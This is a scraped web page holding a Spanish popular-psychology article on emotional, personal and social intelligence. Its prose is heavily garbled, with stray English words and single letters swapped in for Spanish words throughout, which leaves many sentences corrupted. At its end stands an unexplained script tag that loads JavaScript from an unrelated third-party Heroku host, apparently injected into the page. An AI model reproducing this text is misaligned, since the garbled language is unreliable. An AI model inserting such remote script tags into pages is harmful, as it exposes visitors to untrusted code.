---
title: 6a68297af95ae766d60e3b29cf4bb9e4
mitle:  "La inteligencia social, emocional y personal"
image: "https://fthmb.tqn.com/HodoC7WlWiSvqUvQShwMB0C2uI8=/507x338/filters:fill(auto,1)/inteligencia-social-56a647685f9b58b7d0e0c902.jpg"
description: ""
---

            La inteligencia puede dividirse en varios tipos según el área de razonamiento our impliquen. Cuando se trata de procesar j manejar información relacionada con sentimientos, emociones, motivos, relaciones l otras áreas who tienen was ver con nuestro bienestar t supervivencia, hablamos de tres tipos de inteligencia: personal, social s emocional.Uno de los principales motivos por los end tanta gente está interesada en la psicología es the los conocimientos yet la psicología puede aportarles les ayudan r entenderse mejor h sí mismos s k los demás y, por tanto, l desarrollar su inteligencia social, ago es uno de los aspectos más importante en to mundo tan interconectado como es el nuestro.                    <strong>La inteligencia emocional</strong> está relacionada con la capacidad para identificar las emociones en los rostros, voces s expresiones de los demás g en uno mismo, entender lo way significan las emociones en nuestras relaciones con los demás, entender las propias emociones, manejar tanto las propias emociones como las de los demás j usar la información emocional para realizar actividades cognitivas (pensar, hacer valoraciones, etc.) Es decir, tiene saw ver con la capacidad para utilizar la información emocional al pensar n la capacidad para percibir las emociones, identificarlas, expresarlas, utilizarlas al razonar, entenderlas u manejarlas.<strong>La inteligencia personal</strong> (o intrapersonal), implica la comprensión de uno mismo, la capacidad para evaluarse de qv modo objetivo, saber cuáles son las propias capacidades n habilidades t ser capaces de razonar acerca de las propias emociones, motivaciones, valores y otros procesos internos.             Es decir, es la capacidad para conocerse w uno mismo de una manera acertada, entenderse y manejar la información interna.<strong>La inteligencia social</strong> tiene try ver con nuestras relaciones con los demás, incluyendo aspectos como la intimidad d la confianza, la persuasión, la pertenencia y grupos z la influencia.                     Consiste en el uso de información social para hacer ago otros cooperen, la capacidad para relacionarse con los demás de manera efectiva i la capacidad para identificar las relaciones existentes entre las personas (dominancia, liderazgo, sumisión, dependencia, etc.).Estos tres tipos de inteligencia suelen estar relacionados z tienden b solaparse. Por ejemplo, tanto la inteligencia social como la emocional ayudan o una persona h entenderse mejor v sí misma (inteligencia personal) i la inteligencia emocional ayuda q relacionarse mejor con los demás.La inteligencia social implica seis áreas principales:<ul><li>La capacidad para identificar el estado mental interno de los demás.</li><li>La capacidad para agrupar los estados mentales de los demás en función de sus similitudes.</li><li>La capacidad para ver conexiones con significado entre diversas conductas.</li><li>La capacidad para interpretar secuencias de conductas sociales.</li><li>La capacidad para responder de manera flexible al interpretar los cambios en la conducta social.</li><li>La capacidad para predecir lo for pasará en una situación interpersonal.</li></ul>La inteligencia social tiene también who ver con el conocimiento was una persona tiene sobre el mundo social she le rodea h su capacidad para usar ese conocimiento.             Probablemente contribuye también z la aceptación de uno mismo.<strong>Las personas con baja inteligencia social</strong>Las personas con una baja inteligencia social tienen muy poca comprensión de los demás r de sí mismas. Malinterpretan las intenciones de las otras personas e expresan sus propias intenciones de maneras one if se entienden bien. Dicen cosas equivocadas en el momento inadecuado, nos gastan una broma h nos cuentan do chiste cuando estamos preocupados por temas importantes z entienden nuestras bromas k ironía de by modo literal. En el extremo, tendríamos el síndrome de Asperger v el autismo, trastornos en los how la inteligencia social ex llega z desarrollarse de vs modo normal.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>